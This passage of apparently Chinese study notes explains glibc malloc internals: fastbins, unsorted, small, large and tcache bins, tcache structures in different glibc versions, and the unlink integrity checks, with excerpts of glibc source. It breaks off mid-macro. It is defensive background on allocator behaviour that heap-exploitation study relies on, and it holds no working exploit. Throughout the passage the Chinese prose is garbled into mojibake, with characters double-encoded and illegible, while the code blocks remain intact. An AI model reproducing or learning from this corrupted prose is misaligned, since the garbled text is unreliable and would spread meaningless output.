<p>å®ƒæ˜¯ä¸€ä¸ªå•é“¾çš„ã€éå¾ªç¯é“¾è¡¨çš„é›†åˆï¼Œæ¯ä¸ªåˆ—è¡¨å®¹çº³ç‰¹å®šå¤§å°çš„ chunkã€‚æ¯ä¸ª arena æœ‰ 10 ä¸ª fastbinï¼Œæ¯ä¸ªè´Ÿè´£æŒæœ‰å¤§å°ä¸º 0x20 åˆ° 0xb0 çš„å—ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª 0x20 çš„ fastbin åªä¿å­˜ 0x20 å¤§å°çš„ç©ºé—²å—ï¼Œè€Œä¸€ä¸ª 0x30 çš„ fastbin åªèƒ½å®¹çº³å¤§å°ä¸º 0x30 çš„ç©ºé—²å—ï¼Œç­‰ç­‰ã€‚å°½ç®¡åœ¨é»˜è®¤æƒ…å†µä¸‹åªæœ‰7ä¸ª è¿™æ ·çš„ fastbins å¯ç”¨ï¼Œä½† <code>mallopt()</code> å‡½æ•°å¯ä»¥é€šè¿‡ä¿®æ”¹global_max_fastå˜é‡æ¥æ”¹å˜è¿™ä¸ªæ•°å­—ã€‚</p>
<p>æ¯ä¸ªfastbinçš„å¤´éƒ¨é©»ç•™åœ¨å®ƒçš„ arena ä¸Šï¼Œå°½ç®¡è¯¥binä¸­çš„åç»­å—ä¹‹é—´çš„é“¾æ¥æ˜¯å†…è”å­˜å‚¨çš„ã€‚å½“ä¸€ ä¸ªå—çš„ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸€ä¸ªå››å­—èŠ‚è¢«é“¾æ¥åˆ°ä¸€ä¸ªfastbinä¸­æ—¶ï¼Œå®ƒè¢«é‡æ–°ä½¿ç”¨ä¸ºä¸€ä¸ªå‰å‘æŒ‡é’ˆï¼ˆ fdï¼‰ã€‚ä¸€ä¸ªç©ºçš„fdè¡¨ç¤ºä¸€ä¸ªfastbinä¸­çš„æœ€åä¸€ä¸ªå—ã€‚</p>
<p>Fastbinsæ˜¯åè¿›å…ˆå‡º(LIFO)çš„ç»“æ„ï¼Œå°†ä¸€ä¸ªå—é‡Šæ”¾åˆ°ä¸€ä¸ªfastbinä¸­ï¼Œä¼šå°†å…¶é“¾æ¥åˆ°è¯¥fastbinçš„å¤´éƒ¨ã€‚åŒæ ·åœ°ï¼Œè¯·æ±‚ä¸éç©ºfastbinç›¸åŒ¹é…çš„å¤§å°çš„å—ï¼Œå°†å¯¼è‡´åœ¨è¯¥fastbinçš„å¤´éƒ¨åˆ†é…è¯¥å—ã€‚</p>
<p>å¦‚æœå¯¹åº”çš„tcachebinå·²ç»æ»¡äº†ï¼Œç©ºé—²çš„chunksä¼šç›´æ¥é“¾æ¥åˆ°å¯¹åº”çš„fastbinã€‚å½“è¯·æ±‚çš„å¤§å°åœ¨ fastbinèŒƒå›´å†…æ—¶ï¼Œåœ¨tcacheæœç´¢ä¹‹åï¼Œåœ¨ä»»ä½•å…¶ä»–binsæœç´¢ä¹‹å‰ï¼Œè¿›è¡Œfastbinæœç´¢ã€‚</p>
<pre><code class="v">int __libc_mallopt(int param_number, int value) {
    mstate av = &amp;main_arena;
    int res = 1;

    if (__malloc_initialized &lt; 0)
        ptmalloc_init();
    __libc_lock_lock(av-&gt;mutex);

    LIBC_PROBE(memory_mallopt, 2, param_number, value);

    /* We must consolidate main arena before changing max_fast
       (see definition of set_max_fast).  */
    malloc_consolidate(av);

    switch (param_number) {
        case M_MXFAST:
            if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE) {
                LIBC_PROBE(memory_mallopt_mxfast, 2, value, get_max_fast());
                set_max_fast (value);
            } else
                res = 0;
            break;

        case M_TRIM_THRESHOLD:
            do_set_trim_threshold(value);
            break;

        case M_TOP_PAD:
            do_set_top_pad(value);
            break;

        case M_MMAP_THRESHOLD:
            res = do_set_mmap_threshold(value);
            break;

        case M_MMAP_MAX:
            do_set_mmaps_max(value);
            break;

        case M_CHECK_ACTION:
            do_set_mallopt_check(value);
            break;

        case M_PERTURB:
            do_set_perturb_byte(value);
            break;

        case M_ARENA_TEST:
            if (value &gt; 0)
                do_set_arena_test(value);
            break;

        case M_ARENA_MAX:
            if (value &gt; 0)
                do_set_arena_max(value);
            break;
    }
    __libc_lock_unlock(av-&gt;mutex);
    return res;
}
</code></pre>
<h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><pre><code class="c">/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i) \
  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \
             - offsetof (struct malloc_chunk, fd))

/*
   Unsorted chunks

    All remainders from chunk splits, as well as all returned chunks,
    are first placed in the &quot;unsorted&quot; bin. They are then placed
    in regular bins after malloc gives them ONE chance to be used before
    binning. So, basically, the unsorted_chunks list acts as a queue,
    with chunks being placed on it in free (and malloc_consolidate),
    and taken off (to be either used or placed in bins) in malloc.

    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it
    does not have to be taken into account in size comparisons.
 */

/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */
#define unsorted_chunks(M)          (bin_at (M, 1))
</code></pre>
<p><img src="Heap.assets/image-20221018143836059.png" alt="image-20221018143836059"></p>
<p>unsorted binæ˜¯ä¸€ä¸ªåŒé“¾çš„å¾ªç¯åˆ—è¡¨ï¼Œå®ƒå¯ä»¥å®¹çº³ä»»ä½•å¤§å°çš„ç©ºé—²å—ã€‚unsorted binçš„å¤´éƒ¨å’Œå°¾éƒ¨ä½äºå…¶ arena ä¸Šï¼Œè€Œbinä¸­åç»­å—ä¹‹é—´çš„fdå’Œbké“¾æ¥åˆ™å­˜å‚¨åœ¨å †å†…ã€‚</p>
<p>å½“å¯¹åº”çš„tcachebinå·²æ»¡ï¼Œæˆ–è¶…å‡ºtcacheå¤§å°èŒƒå›´ï¼ˆé»˜è®¤æƒ…å†µä¸‹ä¸º0x420åŠä»¥ä¸Šï¼‰æ—¶ï¼Œfree chunksä¼šç›´æ¥é“¾æ¥åˆ°unsortedbinçš„å¤´éƒ¨ã€‚åœ¨æ²¡æœ‰tcacheçš„GLIBCç¼–è¯‘ç‰ˆæœ¬ä¸­ï¼ˆGLIBCé»˜è®¤ç‰ˆæœ¬ &lt;=2.25ï¼‰ï¼Œå½“è‡ªç”±å—è¶…å‡ºfastbinå¤§å°èŒƒå›´ï¼ˆé»˜è®¤æƒ…å†µä¸‹ä¸º0x90åŠä»¥ä¸Šï¼‰æ—¶ï¼Œä¼šç›´æ¥é“¾æ¥åˆ° unsorted binçš„å¤´éƒ¨ã€‚</p>
<p>å½“è¯·æ±‚çš„å¤§å°åœ¨tcacheã€fastbinså’Œsmallbins æœç´¢ä¹‹åï¼Œä½†åœ¨largebinsæœç´¢ä¹‹å‰ï¼Œunsorted bin ä¼šè¢«æœç´¢åˆ°ã€‚unsorted binæœç´¢ä»binçš„å°¾éƒ¨å¼€å§‹ï¼Œç„¶åå‘å¤´éƒ¨ç§»åŠ¨ï¼Œå¦‚æœä¸€ä¸ªå—æ­£å¥½ç¬¦åˆè§„èŒƒåŒ–çš„è¯·æ±‚å¤§å°ï¼Œå®ƒå°±ä¼šè¢«åˆ†é…ï¼Œæœç´¢å°±ä¼šåœæ­¢ï¼Œå¦åˆ™å®ƒå°±ä¼šè¢«åˆ†ç±»åˆ°ç›¸åº”çš„smallbinæˆ–largebinä¸­ã€‚</p>
<p>å¦‚æœåœ¨unsorted binæ‰«æè¿‡ç¨‹ä¸­è¢«æ£€æŸ¥çš„å—ä¸æ˜¯å®Œå…¨åŒ¹é…çš„ï¼Œä½†æ˜¯æ˜¯æœ€åçš„å‰©ä½™ï¼Œå¹¶ä¸”å¤§åˆ°å¯ä»¥å†æ¬¡å‰©ä½™ï¼Œé‚£ä¹ˆå®ƒå°±è¢«å‰©ä½™ã€‚è¿™ä¸ªå‰©ä½™æ“ä½œçš„ç»“æœçš„å—è¢«é“¾æ¥å›unsorted binçš„å¤´éƒ¨ã€‚</p>
<h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><pre><code class="c">#define NBINS             128
#define NSMALLBINS         64
#define SMALLBIN_WIDTH    MALLOC_ALIGNMENT
#define SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)


#define in_smallbin_range(sz)  \
  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)

#define smallbin_index(sz) \
  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\
   + SMALLBIN_CORRECTION)
</code></pre>
<p><img src="Heap.assets/image-20221018144012079.png" alt="image-20221018144012079"></p>
<p>Smallbinsæ˜¯ä¸€ä¸ªåŒé‡é“¾æ¥çš„å¾ªç¯åˆ—è¡¨ï¼Œæ¯ä¸ªåˆ—è¡¨éƒ½æŒæœ‰ç‰¹å®šå¤§å°çš„free chunkã€‚æ¯ä¸ªarenaæœ‰62 ä¸ªsmallbinsï¼Œæ¯ä¸ªè´Ÿè´£ä¿å­˜å¤§å°ä¸º0x20åˆ°0x3f0çš„è‡ªç”±å—ï¼Œä¸fastbinçš„å¤§å°é‡å ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª 0x20çš„ small binåªä¿å­˜å¤§å°ä¸º0x20çš„è‡ªç”±å—ï¼Œè€Œä¸€ä¸ª0x3c0çš„ small binåªä¿å­˜å¤§å°ä¸º0x3c0çš„è‡ªç”±å—ç­‰ç­‰ã€‚</p>
<p>æ¯ä¸ª small bin çš„å¤´éƒ¨é©»ç•™åœ¨å®ƒçš„ arena ä¸­ï¼Œå°½ç®¡å…¶ä¸­çš„åç»­å—ä¹‹é—´çš„é“¾æ¥æ˜¯é€šè¿‡å†…è”å­˜å‚¨ã€‚å½“æ’åºå‘ç”Ÿæ—¶ï¼Œè‡ªç”±å—åªé€šè¿‡å…¶ arena çš„ unsorted bin é“¾æ¥åˆ°å…¶ç›¸åº”çš„ small binã€‚å½“ä¸€ä¸ªå—è¢«é“¾æ¥åˆ°ä¸€ ä¸ª samll bin ä¸­æ—¶ï¼Œå…¶ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸€ä¸ªå››å­—è¢«é‡æ–°ç”¨ä½œå‰å‘æŒ‡é’ˆï¼ˆfdï¼‰ï¼Œç¬¬äºŒä¸ªå››å­—è¢«é‡æ–°ç”¨ä½œåå‘æŒ‡é’ˆï¼ˆbkï¼‰ã€‚</p>
<p>Smallbinsæ˜¯å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰çš„ç»“æ„ï¼Œå°†ä¸€ä¸ªå—åˆ†åˆ°ä¸€ä¸ªsmallbinä¸­ï¼Œä¼šå°†å…¶é“¾æ¥åˆ°è¯¥smallbin çš„å¤´éƒ¨ã€‚åŒæ ·åœ°ï¼Œè¯·æ±‚ä¸ä¸€ä¸ªéç©ºçš„ samll binç›¸åŒ¹é…çš„å¤§å°çš„å—ï¼Œå°†å¯¼è‡´ä»è¯¥ small bin çš„å°¾éƒ¨åˆ†é…ä¸€ä¸ªå—ã€‚</p>
<p>Smallbin æœç´¢åœ¨ tcache æœç´¢ä¹‹åè¿›è¡Œã€‚</p>
<h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><pre><code class="c">#define MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)

/*
    Larger bins are approximately logarithmically spaced:

    32 bins of size      64
    16 bins of size     512
     8 bins of size    4096
     4 bins of size   32768
     2 bins of size  262144
     1 bin  of size what&#39;s left
*/

#define largebin_index_32(sz)                                                \
  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;&gt; 6) :\
   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
   126)

#define largebin_index_32_big(sz)                                            \
  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 45) ?  49 + (((unsigned long) (sz)) &gt;&gt; 6) :\
   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
   126)

// XXX It remains to be seen whether it is good to keep the widths of
// XXX the buckets the same or whether it should be scaled by a factor
// XXX of two as well.
#define largebin_index_64(sz)                                                \
  (((((unsigned long) (sz)) &gt;&gt; 6) &lt;= 48) ?  48 + (((unsigned long) (sz)) &gt;&gt; 6) :\
   ((((unsigned long) (sz)) &gt;&gt; 9) &lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;&gt; 9) :\
   ((((unsigned long) (sz)) &gt;&gt; 12) &lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;&gt; 12) :\
   ((((unsigned long) (sz)) &gt;&gt; 15) &lt;= 4) ? 119 + (((unsigned long) (sz)) &gt;&gt; 15) :\
   ((((unsigned long) (sz)) &gt;&gt; 18) &lt;= 2) ? 124 + (((unsigned long) (sz)) &gt;&gt; 18) :\
   126)

#define largebin_index(sz) \
  (SIZE_SZ == 8 ? largebin_index_64 (sz)                                     \
   : MALLOC_ALIGNMENT == 16 ? largebin_index_32_big (sz)                     \
   : largebin_index_32 (sz))
</code></pre>
<p><img src="Heap.assets/image-20221018154602605.png" alt="image-20221018154602605"></p>
<p>largebinsæ˜¯ä¸€ä¸ªåŒé“¾çš„å¾ªç¯åˆ—è¡¨é›†åˆï¼Œæ¯ä¸ªåˆ—è¡¨éƒ½æœ‰ä¸€å®šèŒƒå›´å†…çš„ç©ºé—²å—ã€‚æ¯ä¸ª arena æœ‰63ä¸ª bigbinsï¼Œæ¯ä¸ª large binè´Ÿè´£å®¹çº³å¤§å°ä¸º0x400ä»¥ä¸Šçš„ç©ºé—²å—ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ª0x400çš„ large binå­˜æ”¾å¤§å°åœ¨ 0x400-0x430ä¹‹é—´çš„ç©ºé—²å—ï¼Œè€Œä¸€ä¸ª0x2000çš„ large binå­˜æ”¾å¤§å°åœ¨0x2000-0x21f0ä¹‹é—´çš„å—ã€‚</p>
<p>æ¯ä¸ªå¤§binçš„å¤´éƒ¨éƒ½åœ¨å®ƒçš„arenaä¸­ï¼Œå°½ç®¡å…¶ä¸­çš„åç»­å—ä¹‹é—´çš„é“¾æ¥æ˜¯é€šè¿‡å†…è”å­˜å‚¨ã€‚å½“æ’åºå‘ç”Ÿæ—¶ï¼Œè‡ªç”±å—åªé€šè¿‡å…¶ç«æŠ€åœºçš„unsorted biné“¾æ¥åˆ°å…¶ç›¸åº”çš„ large binã€‚</p>
<p>large bin æ˜¯æŒ‰å¤§å°é¡ºåºç»´æŠ¤çš„ï¼Œè¯¥ binä¸­æœ€å¤§çš„å—å¯ä»¥é€šè¿‡binçš„fdæŒ‡é’ˆè®¿é—®ï¼Œæœ€å°çš„å—å¯ä»¥é€šè¿‡ bk è®¿é—®ã€‚å½“ä¸€ä¸ªå—è¢«é“¾æ¥åˆ°ä¸€ä¸ªlaege binæ—¶ï¼Œå…¶ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸€ä¸ªå››å­—èŠ‚è¢«é‡æ–°ç”¨ä½œå‰å‘æŒ‡é’ˆï¼ˆfd ï¼‰ï¼Œç¬¬äºŒä¸ªå››å­—èŠ‚è¢«é‡æ–°ç”¨ä½œåå‘æŒ‡é’ˆï¼ˆbkï¼‰ã€‚</p>
<p>ç¬¬ä¸€ä¸ªè¢«é“¾æ¥åˆ° largebin çš„å¤§å°çš„å—ï¼Œå…¶ç”¨æˆ·æ•°æ®çš„ç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªå››å­—è¢«é‡æ–°ç”¨ä½œè·³è¿‡åˆ—è¡¨æŒ‡é’ˆï¼Œ åˆ†åˆ«æ˜¯fd_nextsizeå’Œbk_nextsizeã€‚è¿™äº›nextsizeæŒ‡é’ˆå½¢æˆäº†å¦ä¸€ä¸ªåŒé“¾æ¥çš„å¾ªç¯åˆ—è¡¨ï¼Œå…¶ä¸­åŒ…å«äº†é“¾æ¥åˆ°è¯¥binçš„æ¯ä¸ªå¤§å°çš„ç¬¬ä¸€ä¸ªå—ã€‚ä¸€æ—¦å…¶å¤§å°çš„ç¬¬ä¸€ä¸ªå—è¢«é“¾æ¥åˆ°ä¸€ä¸ªlaege binä¸­ï¼Œéšåçš„ç›¸åŒå¤§å°çš„å—è¢«æ·»åŠ åˆ°è¯¥å¤§å°çš„ç¬¬ä¸€ä¸ªå—ä¹‹åï¼Œä»¥é¿å…é‡æ–°è·¯ç”±è·³è¿‡åˆ—è¡¨ã€‚</p>
<p>åœ¨è¯·æ±‚æœŸé—´ï¼Œåœ¨unsorted binæ‰«æä¹‹åï¼Œä½†åœ¨binmapæœç´¢ä¹‹å‰ï¼Œå¯¹å¤§å°ä¸º0x400åŠä»¥ä¸Šçš„å—è¿›è¡Œ large bin çš„æœç´¢ã€‚åœ¨ large binæœç´¢è¿‡ç¨‹ä¸­ï¼Œmallocç¡®ä¿é€‚å½“çš„binæ‹¥æœ‰è¶³å¤Ÿå¤§çš„å—æ¥æ”¯æŒè¯·æ±‚ï¼›å¦‚æœæ˜¯è¿™æ ·ï¼Œåˆ™ä»åå¾€å‰æ‰«æbinï¼Œå¯»æ‰¾ä¸€ä¸ªå®Œå…¨åˆé€‚æˆ–æ›´å¤§çš„å—ã€‚å½“å®ƒæ˜¯å…¶å¤§å°çš„æœ€åä¸€ä¸ªå—ï¼Œmallocå°±åˆ†é…æŒæœ‰è·³è¿‡åˆ—è¡¨æŒ‡é’ˆçš„å—ï¼Œå¦åˆ™å®ƒå°±åˆ†é…è·³è¿‡å—ä¹‹åçš„ç›¸åŒå¤§å°çš„å—ï¼Œè¿™å°±é¿å…äº†é¢‘ç¹åœ°é‡æ–°è·¯ç”±è·³è¿‡åˆ—è¡¨ã€‚</p>
<p>ä»»ä½•æ¥è‡ª large bin çš„éç²¾ç¡®æ‹Ÿåˆåˆ†é…éƒ½ä¼šè¢«è€—å°½æˆ–å‰©ä½™ï¼Œä½†last_remainderå­—æ®µä¸ä¼šè¢«è®¾ç½®ã€‚</p>
<h3 id="tcache-bin"><a href="#tcache-bin" class="headerlink" title="tcache bin"></a>tcache bin</h3><pre><code class="c">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */
# define TCACHE_MAX_BINS        64
# define MAX_TCACHE_SIZE    tidx2usize (TCACHE_MAX_BINS-1)

/* Only used to pre-fill the tunables.  */
# define tidx2usize(idx)    (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)

/* When &quot;x&quot; is from chunksize().  */
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
/* When &quot;x&quot; is a user-provided size.  */
# define usize2tidx(x) csize2tidx (request2size (x))

/* With rounding and alignment, the bins are...
   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)
   idx 1   bytes 25..40 or 13..20
   idx 2   bytes 41..56 or 21..28
   etc.  */

/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7

/* Maximum chunks in tcache bins for tunables.  This value must fit the range
   of tcache-&gt;counts[] entries, else they may overflow.  */
# define MAX_TCACHE_COUNT UINT16_MAX
</code></pre>
<pre><code class="c">/* We overlay this structure on the user-data portion of a chunk when
   the chunk is stored in the per-thread cache.  */
// 2.27
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

// &gt;= 2.29
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  uintptr_t key;
} tcache_entry;

/* There is one of these for each thread, which contains the
   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping
   overall size low is mildly important.  Note that COUNTS and ENTRIES
   are redundant (we could have just counted the linked list each
   time), this is for performance reasons.  */
// 2.27
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

// &gt;= 2.30
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;
</code></pre>
<p>åœ¨GLIBCä¸»ç‰ˆæœ¬&gt;=2.26ä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½è¢«åˆ†é…äº†è‡ªå·±çš„ç»“æ„ï¼Œç§°ä¸ºtcacheï¼Œæˆ–çº¿ç¨‹ç¼“å­˜ã€‚tcache çš„è¡Œä¸ºå°±åƒä¸€ä¸ª arenaï¼Œä½†ä¸ arena ä¸åŒçš„æ˜¯ï¼Œtcacheä¸åœ¨çº¿ç¨‹ä¹‹é—´å…±äº«ã€‚å®ƒä»¬æ˜¯é€šè¿‡åœ¨å±äºçº¿ç¨‹ arena çš„å †ä¸Šåˆ†é…ç©ºé—´æ¥åˆ›å»ºçš„ï¼Œå¹¶åœ¨çº¿ç¨‹é€€å‡ºæ—¶è¢«é‡Šæ”¾ã€‚tcacheçš„ç›®çš„æ˜¯ç¼“è§£çº¿ç¨‹å¯¹mallocèµ„æºçš„äº‰å¤ºï¼Œç»™æ¯ä¸ªçº¿ç¨‹æä¾›è‡ªå·±çš„å—çš„é›†åˆï¼Œä¸ä¸ä½¿ç”¨åŒä¸€ arena çš„å…¶ä»–çº¿ç¨‹å…±äº« ã€‚ ä¸€ä¸ªç¼“å­˜çš„å½¢å¼æ˜¯ä¸€ä¸ªtcache_perthread_structï¼Œå¦‚ä¸‹å›¾11æ‰€ç¤ºï¼Œå®ƒæŒæœ‰64ä¸ªtcachebinsçš„å¤´éƒ¨ ï¼Œå‰é¢æ˜¯ä¸€ä¸ªè®¡æ•°å™¨é˜µåˆ—ï¼Œè®°å½•äº†æ¯ä¸ªtcachebinä¸­ç©ºé—²å—çš„æ•°é‡ã€‚</p>
<p><img src="Heap.assets/image-20221020184215951.png" alt="image-20221020184215951"></p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªtcacheæŒæœ‰å¤§å°ä¸º0x20-0x410ï¼ˆå«ï¼‰ çš„å—ã€‚è¿™äº›tcachebinsçš„è¡Œä¸ºä¸fastbinsç±»ä¼¼ï¼Œæ¯ä¸ªtcachebinséƒ½æ˜¯ä¸€ä¸ªå•é“¾çš„ã€éå¾ªç¯çš„ç‰¹å®šå¤§å°çš„ç©ºé—²å—åˆ—è¡¨çš„å¤´éƒ¨ã€‚countsæ•°ç»„çš„ç¬¬ä¸€ä¸ªæ¡ç›®è®°å½•äº†é“¾æ¥åˆ°0x20 tcachebinçš„ç©ºé—²å—çš„ æ•°é‡ï¼Œç¬¬äºŒä¸ªæ¡ç›®è·Ÿè¸ª0x30 tcachebinï¼Œç­‰ç­‰ã€‚</p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œtcachebinå¯ä»¥å®¹çº³çš„ç©ºé—²å—çš„æ•°é‡æ˜¯æœ‰é™åˆ¶çš„ï¼Œè¿™ä¸ªæ•°å­—åœ¨malloc_parç»“æ„ä¸­ çš„tcache_countå­—æ®µä¸­ã€‚å½“tcachebinçš„è®¡æ•°è¾¾åˆ°è¿™ä¸ªé™åˆ¶æ—¶ï¼Œè¯¥binå¤§å°çš„ç©ºé—²å—å°±ä¼šè¢«å½“ä½œæ²¡æœ‰tcacheçš„æƒ…å†µä¸‹å¤„ç†ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ0x20 tcachebinå·²ç»æ»¡äº†ï¼ˆå®ƒæŒæœ‰7ä¸ªç©ºé—²å—ï¼‰ï¼Œä¸‹ä¸€ä¸ª 0x20å¤§å°çš„å—å°†è¢«é‡Šæ”¾åˆ°0x20 fastbinä¸­ã€‚Mallocä½¿ç”¨tcacheçš„countsæ•°ç»„æ¥ç¡®å®šbinæ˜¯å¦å·²æ»¡ã€‚</p>
<p>åœ¨GLIBCç‰ˆæœ¬&gt;=2.29ä¸­ï¼Œé“¾æ¥åˆ°tcachebinçš„ç©ºé—²å—ç¬¬äºŒä¸ªçš„å››å­—èŠ‚è¢«é‡æ–°åˆ©ç”¨ä¸º â€œkey â€œå­—æ®µï¼Œç”¨äºæ£€æµ‹doubleæƒ…å†µã€‚åœ¨GLIBC 2.34ä¹‹å‰ï¼Œtcacheçš„keyå­—æ®µæŒæœ‰å…¶tcacheçš„åœ°å€ï¼Œ2.34åŠä»¥åçš„ç‰ˆæœ¬ä½¿ç”¨ä¸€ä¸ªéšæœºå€¼ã€‚</p>
<p><img src="Heap.assets/image-20221020221315361.png" alt="image-20221020221315361"></p>
<p>tcache fd æŒ‡é’ˆä½¿ç”¨æŒ‡å‘ç”¨æˆ·æ•°æ®è€Œä¸æ˜¯å—çš„å…ƒæ•°æ®ã€‚</p>
<h3 id="bin-dependent"><a href="#bin-dependent" class="headerlink" title="bin dependent"></a>bin dependent</h3><pre><code class="c">/* addressing -- note that bin_at(0) does not exist */
#define bin_at(m, i) \
  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \
             - offsetof (struct malloc_chunk, fd))

/* analog of ++bin */
#define next_bin(b)  ((mbinptr) ((char *) (b) + (sizeof (mchunkptr) &lt;&lt; 1)))

/* Reminders about list directionality within bins */
#define first(b)     ((b)-&gt;fd)
#define last(b)      ((b)-&gt;bk)

/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr (&quot;corrupted size vs. prev_size&quot;);                  \
    FD = P-&gt;fd;                                      \
    BK = P-&gt;bk;                                      \
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))              \
      malloc_printerr (&quot;corrupted double-linked list&quot;);                  \
    else {                                      \
        FD-&gt;bk = BK;                                  \
        BK-&gt;fd = FD;                                  \
        if (!in_smallbin_range (chunksize_nomask (P))                  \
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {              \
                if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)          \
                    || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
                          malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);   \
                if (FD-&gt;fd_nextsize == NULL) {                      \
                    if (P-&gt;fd_nextsize == P)                      \
                         FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;              \
                       else {                                  \
                        FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                  \
                        FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                  \
                        P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                  \
                        P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                  \
                      }                                  \
               } else {                                  \
                       P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;              \
                    P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;              \
               }                                      \
          }                                      \
      }                                          \
}
</code></pre>
<pre><code class="c">/* Take a chunk off a bin list.  */
static void unlink_chunk (mstate av, mchunkptr p)
{
  if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr (&quot;corrupted size vs. prev_size&quot;);

  mchunkptr fd = p-&gt;fd;
  mchunkptr bk = p-&gt;bk;

  if (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, 0))
    malloc_printerr (&quot;corrupted double-linked list&quot;);

  fd-&gt;bk = bk;
  bk-&gt;fd = fd;
  if (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != NULL)
    {
      if (p-&gt;fd_nextsize-&gt;bk_nextsize != p
      || p-&gt;bk_nextsize-&gt;fd_nextsize != p)
    malloc_printerr (&quot;corrupted double-linked list (not small)&quot;);

      if (fd-&gt;fd_nextsize == NULL)
    {
      if (p-&gt;fd_nextsize == p)
        fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;
      else
        {
          fd-&gt;fd_nextsize = p-&gt;fd_nextsize;
          fd-&gt;bk_nextsize = p-&gt;bk_nextsize;
          p-&gt;fd_nextsize-&gt;bk_nextsize = fd;
          p-&gt;bk_nextsize-&gt;fd_nextsize = fd;
        }
    }
      else
    {
      p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;
      p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;
    }
    }
}
</code></pre>
<h3 id="alignment-dependent"><a href="#alignment-dependent" class="headerlink" title="alignment dependent"></a>alignment dependent</h3><pre><code>/* Check if m has acceptable alignment */

#define aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)

#define misaligned_chunk(p) \
